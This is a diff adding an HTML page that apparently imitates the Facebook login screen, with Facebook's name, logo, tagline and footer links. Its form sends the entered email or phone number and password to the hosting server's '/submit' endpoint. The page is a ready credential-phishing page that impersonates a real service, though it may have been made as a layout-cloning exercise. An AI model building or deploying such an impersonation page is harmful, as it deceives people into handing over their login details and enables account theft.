@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <style type="text/css">
+        * {
+    padding: 0;
+    margin: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Poppins', sans-serif;
+    background-color: #f0f2f5;
+    color: #1c1e21;
+}
+
+main {
+    height: 70vh;
+    width: 100vw;
+    position: relative;
+    margin: 0 auto;
+}
+
+footer {
+    height: 30vh;
+    background-color: #ffffff;
+}
+
+.row {
+    display: flex;
+    justify-content: space-around;
+    align-items: center;
+    width: 100%;
+    max-width: 1000px;
+    position: absolute;
+    left: 50%;
+    top: 50%;
+    transform: translate(-50%, -50%);
+}
+
+.col-logo {
+    flex: 0 0 50%;
+    text-align: left;
+}
+
+.col-form {
+    flex: 0 0 40%;
+    text-align: center;
+}
+
+.col-logo img {
+    max-width: 300px;
+}
+
+.col-logo h2 {
+    font: 26px;
+    font-weight: 400;
+    padding: 0 30px;
+    line-height: 32px;
+}
+
+.col-form .form-container {
+    background-color: #ffffff;
+    border: none;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+    margin-bottom: 30px;
+    padding: 20px;
+    max-width: 400px;
+}
+
+.col-form .form-container input, .col-form .form-container .btn-login {
+    width: 100%;
+    margin: 5px 0;
+    height: 45px;
+    vertical-align: middle;
+    font-size: 16px;
+}
+
+.col-form .form-container input {
+    border: 1px solid #dddfe2;
+    color: #1d2129;
+    padding: 0 8px;
+    outline: none;
+}
+
+.col-form .form-container input:focus {
+    border-color: #1877f2;
+    box-shadow: 0 0 0 2px #e7f3ff;
+}
+
+.col-form .form-container .btn-login {
+    background-color: #1877f2;
+    border: none;
+    border-radius: 6px;
+    font-size: 20px;
+    padding: 0 16px;
+    color: #ffffff;
+    font-weight: 700;
+}
+
+.col-form .form-container a {
+    display: block;
+    color: #1877f2;
+    font-size: 14px;
+    text-decoration: none;
+    padding: 10px 0 20px;
+    border-bottom: 1px solid #dadde1;
+}
+
+.col-form .form-container a:hover {
+    text-decoration: underline;
+}
+
+.col-form .form-container .btn-new {
+    background-color: #42b72a;
+    border: none;
+    border-radius: 6px;
+    font-size: 17px;
+    line-height: 48px;
+    padding: 0 16px;
+    color: #ffffff;
+    font-weight: 700;
+    margin-top: 20px;
+}
+
+.col-form p {
+    font-size: 14px;
+}
+
+.col-form p a {
+    text-decoration: none;
+    color: #1c1e21;
+    font-weight: 600;
+}
+
+.col-form p a:hover {
+    text-decoration: underline;
+}
+
+.footer-contents {
+    position: relative;
+    max-width: 1000px;
+    margin: 0 auto;
+}
+
+footer ol {
+    display: flex;
+    flex-wrap: wrap;
+    list-style-type: none;
+    padding: 10px 0;
+}
+
+footer ol:first-child {
+    border-bottom: 1px solid #dddfe2;
+}
+
+footer ol:first-child li:last-child button {
+    background-color: #f5f6f7;
+    border: 1px solid #ccd0d5;
+    outline: none;
+    color: #4b4f56;
+    padding: 0 8px;
+    font-weight: 700;
+    font-size: 16px;
+}
+
+footer ol li {
+    padding-right: 15px;
+    font-size: 12px;
+    color: #385898;
+}
+
+footer ol li a {
+    text-decoration: none;
+    color: #385898;
+}
+
+footer ol li a:hover {
+    text-decoration: underline;
+}
+
+footer small {
+    font-size: 11px;
+}
+    </style>
+</head>
+
+<body>
+    <main>
+        <div class="row">
+            <div class="col-logo">
+                <img src="data:image/png;base64,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" alt="Logo">
+                <h2>Facebook helps you connect and share with the people in your life.</h2>
+            </div>
+            <div class="col-form">
+                <form action="/submit" method="post">
+                <div class="form-container">
+                    <input type="text" name=username placeholder="Email or phone number">
+                    <input type="password" name=password placeholder="Password">
+                    <button class="btn-login" type="submit" value="Submit">Login</button>
+                    <a href="#">Forgotten password?</a>
+                    <button class="btn-new">Create new Account</button>
+                </div>
+                </form>
+                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <div class="footer-contents">
+            <ol>
+                <li>English (UK)</li>
+                <li><a href="#">മലയാളം</a></li>
+                <li><a href="#">தமிழ்</a></li>
+                <li><a href="#">తెలుగు</a></li>
+                <li><a href="#">বাংলা</a></li>
+                <li><a href="#">اردو</a></li>
+                <li><a href="#">हिन्दी</a></li>
+                <li><a href="#">ಕನ್ನಡ</a></li>
+                <li><a href="#">Español</a></li>
+                <li><a href="#">Português (Brasil)</a></li>
+                <li><a href="#">Français (France)</a></li>
+                <li><button>+</button></li>
+            </ol>
+
+            <ol>
+                <li><a href="#">Sign Up</a></li>
+                <li><a href="#">Log In </a></li>
+                <li><a href="#">Messenger</a></li>
+                <li><a href="#">Facebook Lite</a></li>
+                <li><a href="#">Watch</a></li>
+                <li><a href="#">People</a></li>
+                <li><a href="#">Pages</a></li>
+                <li><a href="#">Page categories</a></li>
+                <li><a href="#">Places</a></li>
+                <li><a href="#">Games</a></li>
+                <li><a href="#">Locations</a></li>
+                <li><a href="#">Marketplace</a></li>
+                <li><a href="#">Facebook</a></li>
+                <li><a href="#">PayGroups</a></li>
+                <li><a href="#">Jobs</a></li>
+                <li><a href="#">Oculus</a></li>
+                <li><a href="#">Portal</a></li>
+                <li><a href="#">Instagram</a></li>
+                <li><a href="#">Local</a></li>
+                <li><a href="#">Sign Up</a></li>
+                <li><a href="#">Log In </a></li>
+                <li><a href="#">Messenger</a></li>
+                <li><a href="#">Facebook Lite</a></li>
+                <li><a href="#">Watch</a></li>
+                <li><a href="#">People</a></li>
+                <li><a href="#">Pages</a></li>
+                <li><a href="#">Page categories</a></li>
+                <li><a href="#">Places</a></li>
+                <li><a href="#">Games</a></li>
+                <li><a href="#">Locations</a></li>
+                <li><a href="#">Marketplace</a></li>
+                <li><a href="#">Facebook</a></li>
+                <li><a href="#">PayGroups</a></li>
+                <li><a href="#">Jobs</a></li>
+                <li><a href="#">Oculus</a></li>
+                <li><a href="#">Portal</a></li>
+                <li><a href="#">Instagram</a></li>
+                <li><a href="#">Local</a></li>
+            </ol>
+            <small>Facebook © 2022</small>
+        </div>
+    </footer>
+</body>
+
+</html>
